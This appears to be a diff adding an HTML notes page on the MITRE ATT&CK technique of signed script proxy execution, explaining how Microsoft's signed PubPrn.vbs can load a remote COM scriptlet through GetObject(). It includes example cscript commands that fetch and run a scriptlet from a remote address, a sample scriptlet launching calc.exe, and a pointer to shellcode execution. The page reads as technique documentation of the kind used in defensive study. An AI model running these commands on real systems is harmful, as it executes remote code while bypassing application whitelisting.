@@ -1,0 +1,49 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>PubPrn.vbs</title>
+</head><body><a href="https://attack.mitre.org/techniques/T1216/">https://attack.mitre.org/techniques/T1216/</a>&nbsp; <br/>
+<br/>
+<span style="font-size: 10pt">tl;dr: C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs 127.0.0.1 script:&lt;Payload&gt;<br/>
+<br/>
+Signed Script Proxy Execution<div style="text-align: left"><span style="font-family: Roboto-Regular"><br/>
+</span></div><div style="text-align: left"><span style="font-family: Roboto-Regular">Scripts signed with trusted certificates can be used to proxy execution of malicious files. This behavior may bypass signature validation restrictions and application whitelisting solutions that do not account for use of these scripts.<br/>
+<br/>
+</span></div>&nbsp; <br/>
+<div style="text-align: left"><span style="font-family: Roboto-Regular">PubPrn.vbs is signed by Microsoft and can be used to proxy execution from a remote site. <a href="https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/">[1]</a> Example command: <br/>
+cscript C[:]\Windows\System32\Printing_Admin_Scripts\en-US\pubprn[.]vbs 127.0.0.1 script:http[:]//192.168.1.100/hi.png<br/>
+</span></div><br/>
+</span><span style="font-size: 10pt"><span style="font-family: Roboto-Regular"><div style="text-align: left">There are several other signed scripts that may be used in a similar manner. <a href="https://github.com/api0cradle/UltimateAppLockerByPassList">[2]</a></div></span></span><br/>
+<br/>
+<br/>
+When abusing injection, we are taking advantage of attacker controlled input passed to GetObject() and then combining that with the “script:” or “scriptlet:” COM monikers.<br/>
+<br/>
+GetObject()<br/>
+<br/>
+This method allows you to access an already instantiated COM object. If there isn’t an instance of the object already (if invoked without a moniker), this call will fail. For example, accessing Microsoft Excel’s COM object via GetObject() would look like this:<br/>
+<br/>
+Set obj = GetObject( , "Excel.Application")<br/>
+<br/>
+For the above to work, an instance of Excel has to be running. You can read more about GetObject() here. <br/>
+<br/>
+While GetObject() is interesting by itself, it only allows us to access an instance of an already instantiated COM object. To get around this, we can implement a COM moniker to facilitate our payload execution. If you aren’t familiar with COM monikers, you can read more about them here. There are various COM monikers on Windows that allow you to instantiate objects in various ways. From an offensive standpoint, you can use these monikers to execute malicious code.<br/>
+<br/>
+An example COM scriptlet will look like this:<br/>
+<br/>
+&lt;?XML version="1.0"?&gt;<br/>
+var r = new ActiveXObject("WScript.Shell").Run("calc.exe");<br/>
+]]&gt;<br/>
+&lt;/scriptlet&gt;<br/>
+<br/>
+You can also use James Forshaw’s (@tiraniddo) tool DotNetToJScript to extend the JScript/VBScript in the COM Scriptlet, allowing for Win32 API access and even Shellcode execution. When you combine one of these two monikers and various calls to GetObject(), a lot of fun is had.<br/>
+<br/>
+PubPrn.vbs<br/>
+<br/>
+On Windows 7+, there is a Microsoft Signed WSH script called “PubPrn.vbs,” which resides in “C:\Windows\System32\Printing_Admin_Scripts\en-US”. When looking at this particular script, it becomes apparent that it is taking input provided by the user (via command line arguments) and passing an argument to “GetObject()”.<br/>
+<br/>
+This means that we can run this script and pass it the two arguments it expects. The first argument can be anything and the second argument is the payload via the script: moniker.<br/>
+<br/>
+Note: If you provide a value that isn’t a network address for the first argument (since it expects a ServerName), you can add the “/b” switch to cscript.exe when calling to suppress any additional error messages.<br/>
+<br/>
+Since VBScript relies on COM to perform actions, it is used heavily in numerous Microsoft signed scripts.</body></html>
